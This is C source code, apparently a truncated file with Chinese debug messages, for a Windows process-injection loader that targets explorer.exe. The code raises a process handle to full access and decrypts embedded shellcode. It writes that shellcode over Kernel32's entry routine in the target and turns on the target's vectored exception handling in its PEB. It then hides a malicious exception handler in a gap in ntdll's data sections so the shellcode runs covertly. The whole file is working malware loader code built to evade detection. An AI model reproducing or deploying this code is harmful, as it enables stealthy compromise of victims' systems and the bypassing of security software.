	PVOID* ProcessHeaps; // PHEAP

	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;

	PRTL_CRITICAL_SECTION LoaderLock;

	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	ULONG_PTR ActiveProcessAffinityMask;
	PVOID GdiHandleBuffer;
	PVOID PostProcessInitRoutine;

	PVOID TlsExpansionBitmap;
	ULONG TlsExpansionBitmapBits[32];

	ULONG SessionId;

	ULARGE_INTEGER AppCompatFlags;
	ULARGE_INTEGER AppCompatFlagsUser;
	PVOID pShimData;
	PVOID AppCompatInfo; // APPCOMPAT_EXE_DATA

	LPVOID CSDVersion;

	PVOID ActivationContextData; // ACTIVATION_CONTEXT_DATA
	PVOID ProcessAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP
	PVOID SystemDefaultActivationContextData; // ACTIVATION_CONTEXT_DATA
	PVOID SystemAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP

	SIZE_T MinimumStackCommit;

	PVOID* FlsCallback;
	LIST_ENTRY FlsListHead;
	PVOID FlsBitmap;
	ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
	ULONG FlsHighIndex;

	PVOID WerRegistrationData;
	PVOID WerShipAssertPtr;
	PVOID pUnused; // pContextData
	PVOID pImageHeaderHash;
	union
	{
		ULONG TracingFlags;
		struct
		{
			ULONG HeapTracingEnabled : 1;
			ULONG CritSecTracingEnabled : 1;
			ULONG LibLoaderTracingEnabled : 1;
			ULONG SpareTracingBits : 29;
		} s3;
	} u4;
	ULONGLONG CsrServerReadOnlySharedMemoryBase;
	PVOID TppWorkerpListLock;
	LIST_ENTRY TppWorkerpList;
	PVOID WaitOnAddressHashTable[128];
	PVOID TelemetryCoverageHeader; // REDSTONE3
	ULONG CloudFileFlags;
} PEB2, * PPEB2;

typedef struct _VECTXCPT_CALLOUT_ENTRY {
	LIST_ENTRY ListEntry;
	PVOID reserved;
	int test;
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY, * PVECTXCPT_CALLOUT_ENTRY;


typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN int ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef HRESULT(WINAPI* pRtlEncodeRemotePointer)(_In_ HANDLE ProcessToken, _In_opt_ PVOID Ptr, _Out_ PVOID* EncodedPtr);

//Get address and size of a section within NTDLL (via LdrGetDllHandle)
BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize) {
	PVOID hNtdll = NULL;
	UNICODE_STRING usNtdll;
	RtlInitUnicodeString(&usNtdll, L"ntdll.dll");
	NTSTATUS status = LdrGetDllHandle(NULL, NULL, &usNtdll, &hNtdll);
	if (hNtdll == NULL) return FALSE;

	PIMAGE_DOS_HEADER ntdllDos = (PIMAGE_DOS_HEADER)hNtdll;
	PIMAGE_NT_HEADERS ntdllNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + ntdllDos->e_lfanew);
	for (WORD i = 0; i < ntdllNt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntdllNt) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)sectionHeader->Name, sectionName)) {
			*sectionVa = (PVOID)((ULONG_PTR)hNtdll + sectionHeader->VirtualAddress);
			*sectionSize = sectionHeader->Misc.VirtualSize;
		}
	}

	return TRUE;

}

//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
PVOID findLdrpVectorHandlerList(PVOID VEH)
{
	BOOL found = FALSE;

	if (VEH == NULL)
		return NULL;

	PLIST_ENTRY next = ((PLIST_ENTRY)VEH)->Flink;

	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (GetNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != VEH)
		{
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID)((ULONG_PTR)sectionVa + sectionSz)) {
				break;
			}
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}
			next = next->Flink;
		}
	}

	return found ? next : NULL;
}

//Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
void EnableRemoteVEH(HANDLE hProcess) {
	#ifdef DEBUG
	printf("[*] 正在启用目标进程VEH...\n");
	#endif
	PROCESS_BASIC_INFORMATION processInfo = { 0 };
	ULONG returnLength = 0;
	SFNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(processInfo), &returnLength);
	//Read the PEB from the remote process
	PEB2 peb_copy;
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		#ifdef DEBUG
		printf("[-] 读取目标进程PEB失败\n");
		#endif
		exit(0);
	}
	//Enable VEH in our local copy and write it to the remote process
	peb_copy.u2.CrossProcessFlags = 0x4;
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesWritten);
	if (bytesWritten == 0) {
		#ifdef DEBUG
		printf("[-] 写入目标进程PEB失败\n");
		#endif
		exit(0);
	}
	//Reread the remote PEB to ensure that we did enable VEH
	bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		#ifdef DEBUG
		printf("[-] 写入目标进程PEB验证失败\n");
		#endif
		exit(0);
	}
	if (peb_copy.u2.CrossProcessFlags & 0x4) {
		#ifdef DEBUG
		printf("[+] 成功启用目标进程VEH\n");
		#endif
		return;
	}
	else {
		#ifdef DEBUG
		printf("[-] 启用目标进程VEH失败\n");
		#endif
	}
	exit(0);

}

// 扫描远程进程指定区域 查找满足对齐要求且长度为holeSize的连续零字节空洞
static PVOID FindZeroHoleInRemote(
    HANDLE hProcess,
    PVOID regionBase,
    SIZE_T regionSize,
    SIZE_T holeSize,
    SIZE_T alignment)
{
    ULONG_PTR start = (ULONG_PTR)regionBase;
    ULONG_PTR end = start + regionSize;
    ULONG_PTR current = start;

    BYTE buffer[0x2000];
    SIZE_T bufferCap = sizeof(buffer);

    SIZE_T zeroRun = 0;
    ULONG_PTR zeroRunStart = 0;

    #ifdef DEBUG
    printf("[+] 寻找内存空洞: 基址=%p 区域长度=0x%zx 需求长度=0x%zx 对齐=0x%zx\n", regionBase, regionSize, holeSize, alignment);
    #endif

    while (current < end) {
        // 查询当前页的保护，跳过非可写页（避免命中只读 Image 页）
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T qsz = 0;
        NTSTATUS qst = SFNtQueryVirtualMemory(hProcess, (PVOID)current, MemoryBasicInformation, &mbi, sizeof(mbi), &qsz);
        if (qst == 0) {
            ULONG protect = mbi.Protect & 0xFF;
            if (!(protect == PAGE_READWRITE || protect == PAGE_EXECUTE_READWRITE || protect == PAGE_WRITECOPY || protect == PAGE_EXECUTE_WRITECOPY)) {
                #ifdef DEBUG
                printf("[+] 跳过非可写页: 基址=%p 长度=0x%zx 保护=0x%X\n", mbi.BaseAddress, mbi.RegionSize, mbi.Protect);
                #endif
                current = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
                zeroRun = 0;
                continue;
            }
        }
        SIZE_T toRead = (SIZE_T)((end - current) < bufferCap ? (end - current) : bufferCap);
        SIZE_T bytesRead = 0;

        NTSTATUS st = SFNtReadVirtualMemory(hProcess, (PVOID)current, buffer, toRead, &bytesRead);
        if (st != 0 || bytesRead == 0) {
            #ifdef DEBUG
            printf("[+] 读取失败/空页: 基址=%p 长度=0x%zx st=0x%08X bytesRead=0x%zx\n", (PVOID)current, toRead, st, bytesRead);
            #endif
            zeroRun = 0;
            current += toRead;
            continue;
        }

        for (SIZE_T i = 0; i < bytesRead; i++) {
            if (buffer[i] == 0) {
                if (zeroRun == 0) {
                    zeroRunStart = current + i;
                }
                zeroRun++;

                if (zeroRun >= holeSize) {
                    ULONG_PTR aligned = (zeroRunStart + (alignment - 1)) & ~(alignment - 1);
                    ULONG_PTR coveredEnd = current + i + 1;
                    if (aligned + holeSize <= coveredEnd) {
                        #ifdef DEBUG
                        printf("[+] 找到内存空洞: 地址=%p 长度>=0x%zx (对齐=%p)\n", (PVOID)zeroRunStart, zeroRun, (PVOID)aligned);
                        #endif
                        return (PVOID)aligned;
                    }
                }
            }
            else {
                zeroRun = 0;
            }
        }

        current += bytesRead;
    }

    #ifdef DEBUG
    printf("[+] 未找到内存空洞\n");
    #endif
    return NULL;
}

int main() {
	NTSTATUS status;
	PVOID VEH = AddVectoredExceptionHandler(1, ExceptionHandler); // GalaxyGate VEH

	DWORD ProcessPid = ConvertProcNameToPid(L"plor"); // 即explorer

	HANDLE hProcess = 0;
	HANDLE hProcessLowPriv = 0;
	CLIENT_ID clientId = { (HANDLE)ProcessPid, 0 };
	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
	SFNtOpenProcess(&hProcessLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
	hProcess = ElevateHandle(hProcessLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
	if (hProcess == 0) {
		#ifdef DEBUG
		printf("[-] 句柄权限提升失败\n");
		#endif
		return 0;
	}

	unsigned char* shellcode = shellcode_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode));
	SIZE_T shellcodeSize = sizeof(encrypted_shellcode);

	DWORD mrdataSize;
	PVOID mrdataVa;
	GetNtdllSectionVa(".mrdata", &mrdataVa, &mrdataSize);

	DWORD dataSize;
	PVOID dataVa;
	GetNtdllSectionVa(".data", &dataVa, &dataSize);

	//Get the address of the Vectored Handler List in our local process, since it should be the same in the remote process
	PVOID LdrpVectoredHandlerList = findLdrpVectorHandlerList(VEH);

	EnableRemoteVEH(hProcess);

	// 写入Shellcode
	ULONG oldProtect = 0;
	LPVOID shellcodeAddress = GetLocalKernel32EntryPoint();
	#ifdef DEBUG
	printf("[*] 正在将Shellcode注入到Kernel32!BaseDllInitialize(0x%p)...\n", shellcodeAddress);
	#endif
	PVOID protectBase = shellcodeAddress;
	SIZE_T protectSize = shellcodeSize;
	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, &bytesWritten);
	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);

	//Encode the pointer to our shellcode in the context of the remote process via ntdll
	#ifdef DEBUG
	printf("[*] 正在编码Shellcode指针...\n");
	#endif
	PVOID encodedShellcodePointer = NULL;
	PVOID ntdllBase = NULL;
	UNICODE_STRING usNtdll;
	RtlInitUnicodeString(&usNtdll, L"ntdll.dll");
	status = LdrGetDllHandle(NULL, NULL, &usNtdll, &ntdllBase);
	ANSI_STRING asFunc;
	RtlInitAnsiString(&asFunc, "RtlEncodeRemotePointer");
	typedef NTSTATUS(NTAPI* PRtlEncodeRemotePointer)(HANDLE ProcessHandle, PVOID Ptr, PVOID* EncodedPtr);
	PRtlEncodeRemotePointer pRtlEncodeRemotePointer = NULL;
	status = LdrGetProcedureAddress(ntdllBase, &asFunc, 0, (PVOID*)&pRtlEncodeRemotePointer);
	status = pRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
	#ifdef DEBUG
	printf("[+] 编码Shellcode指针完成 指针: 0x%p\n", encodedShellcodePointer);
	#endif
	//Allocate our VEH and set the pointer to our encoded pointer
	PVECTXCPT_CALLOUT_ENTRY maliciousHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
	maliciousHandler->VectoredHandler = encodedShellcodePointer;

	//Read the LdrpVectoredHandlerList from the remote process
	//For a suspended process this shouldn't have any entries in it
	PLIST_ENTRY firstEntry = (PLIST_ENTRY)malloc(sizeof(LIST_ENTRY));
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesRead);

	//Set our malicious handler so that the Flink/Blink point to the remote VEH ListHead
	((PLIST_ENTRY)maliciousHandler)->Flink = firstEntry->Flink;
	((PLIST_ENTRY)maliciousHandler)->Blink = firstEntry->Blink;

	// 在ntdll .data段寻找空洞
	#ifdef DEBUG
	printf("[*] 正在ntdll .data段寻找空洞 写入VEH结点...\n");
	#endif
	PVOID scanBase = dataVa;
	SIZE_T scanSize = dataSize;
	const char* scanName = ".data";
	SIZE_T calloutSize = sizeof(VECTXCPT_CALLOUT_ENTRY);
	SIZE_T holeAlignment = sizeof(void*);
	SIZE_T totalNeeded = calloutSize + sizeof(ULONGLONG);
	totalNeeded = (SIZE_T)ALIGN_UP(totalNeeded, holeAlignment);
	PVOID zeroHole = FindZeroHoleInRemote(hProcess, scanBase, scanSize, totalNeeded, holeAlignment);
	if (zeroHole == NULL) { // 若失败 在ntdll .mrdata段寻找空洞
		#ifdef DEBUG
		printf("[+] 在.data段寻找空洞失败 正在.mrdata段寻找空洞\n");
		#endif
		scanBase = mrdataVa;
		scanSize = mrdataSize;
		scanName = ".mrdata";
		zeroHole = FindZeroHoleInRemote(hProcess, scanBase, scanSize, totalNeeded, holeAlignment);
	}
	if (zeroHole != NULL) {
		ULONGLONG ref64 = 1;
		PVOID refAddress = (PVOID)ALIGN_UP(((ULONG_PTR)zeroHole + calloutSize), sizeof(ULONGLONG));
		bytesWritten = 0;
		SFNtWriteVirtualMemory(hProcess, refAddress, &ref64, sizeof(ULONGLONG), &bytesWritten);
		#ifdef DEBUG
		printf("[+] 写入ref64:0x%llX 地址%p, 写入字节数0x%zx\n", ref64, refAddress, bytesWritten);
		#endif

		// 更新本地结点的 reserved 指向 refAddress
		maliciousHandler->reserved = refAddress;

		// 写入结点本体
		bytesWritten = 0;
		SFNtWriteVirtualMemory(hProcess, zeroHole, maliciousHandler, calloutSize, &bytesWritten);
		#ifdef DEBUG
		printf("[+] 写入handler节点: 地址%p 长度0x%zx, 写入字节数0x%zx\n", zeroHole, calloutSize, bytesWritten);
		#endif

		// 更改我们复制的 ListHead 为指向零洞中的结点（保持结点的 Flink/Blink 指向 ListHead）
		firstEntry->Blink = zeroHole;
		firstEntry->Flink = zeroHole;

		// 将更新后的 ListHead 写回对应的节（多数情况下是 .data）
		bytesWritten = 0;
		SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);

		// 若写入失败（只读页），短暂修改页保护为 RW -> 写入 -> 恢复
		if (bytesWritten == 0) {
			PVOID protBase = (PVOID)((ULONG_PTR)LdrpVectoredHandlerList & ~(ULONG_PTR)0xFFF);
			SIZE_T protSize = (((ULONG_PTR)LdrpVectoredHandlerList + sizeof(LIST_ENTRY) + 0xFFF) & ~(ULONG_PTR)0xFFF) - (ULONG_PTR)protBase;
			ULONG oldProtPage = 0, tmpOld = 0;
			#ifdef DEBUG
			printf("[!] ListHead直接写入失败 修改页保护为RW: 地址%p 长度0x%zx\n", protBase, protSize);
			#endif
			SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, PAGE_READWRITE, &oldProtPage);
			bytesWritten = 0;
			SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);
			SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, oldProtPage ? oldProtPage : PAGE_READONLY, &tmpOld);
		}
		#ifdef DEBUG
		printf("[+] 向目标写入VEH ListHead: 地址%p -> Flink=%p Blink=%p, 写入字节数0x%zx\n", LdrpVectoredHandlerList, firstEntry->Flink, firstEntry->Blink, bytesWritten);
		#endif

		goto INJECTION_DONE;
	} else {
		#ifdef DEBUG
		printf("[-] 未找到空洞\n");
		#endif
		return 0;
	}

	bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);

INJECTION_DONE:
	#ifdef DEBUG
	printf("[+] 注入完成\n");
	#endif
	return 0;
}

